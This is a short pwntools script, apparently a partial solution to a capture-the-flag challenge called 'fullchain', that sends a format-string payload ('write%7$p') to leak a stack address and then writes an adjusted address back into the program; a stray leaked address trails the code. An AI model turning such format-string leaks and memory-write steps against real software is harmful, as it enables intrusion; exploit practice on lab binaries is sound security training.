from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

# r = remote('edu-ctf.zoolab.org', 30201)
r = process('./fullchain')

gdb.attach(r)

r.sendafter("global or local > ", b'local\n')
r.sendafter('set read or write > ', b'write%7$p\n')
r.recvuntil('write')
cnt_address = r.recvline()
print(cnt_address)
cnt_address = cnt_address[:-2]
cnt_address = hex(int(cnt_address) + 36)

r.sendafter("global or local > ", b'local\n')
r.sendafter('set read or write > ', b'read\n')
r.sendafter('length > ', str(0x20).encode())
r.send(cnt_address)


r.interactive()
0x7ffe6eff5ab4